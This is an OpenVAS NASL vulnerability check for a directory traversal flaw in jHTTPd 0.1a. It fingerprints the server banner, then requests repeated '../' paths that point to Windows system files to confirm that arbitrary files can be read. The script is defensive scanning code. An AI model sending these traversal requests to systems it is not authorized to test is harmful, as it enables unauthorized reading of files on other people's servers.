###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_jhttpd_dir_traversal_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# jHTTPd Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902404");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-04-01 15:39:52 +0200 (Fri, 01 Apr 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("jHTTPd Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17068/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8082);
  script_mandatory_keys("jHTTPd/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.");
  script_tag(name:"affected", value:"jHTTPd version 0.1a on windows.");
  script_tag(name:"insight", value:"The flaws are due to an error in validating backslashes in
  the filenames.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running jHTTPd and is prone to directory traversal
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

jhPort = get_http_port(default:8082);

banner = get_http_banner(port:jhPort);
if(!banner || "Server: jHTTPd" >!< banner){
 exit(0);
}

files = traversal_files("windows");

foreach file(keys(files)) {

  data = crap(data:"../", length:16);
  exp = data + "/" + files[file];

  if(http_vuln_check(port:jhPort, url:exp, pattern:file,
                     check_header:TRUE)) {
    report = report_vuln_url(port:jhPort, url:exp);
    security_message(port:jhPort, data:report);
    exit(0);
  }
}

exit(99);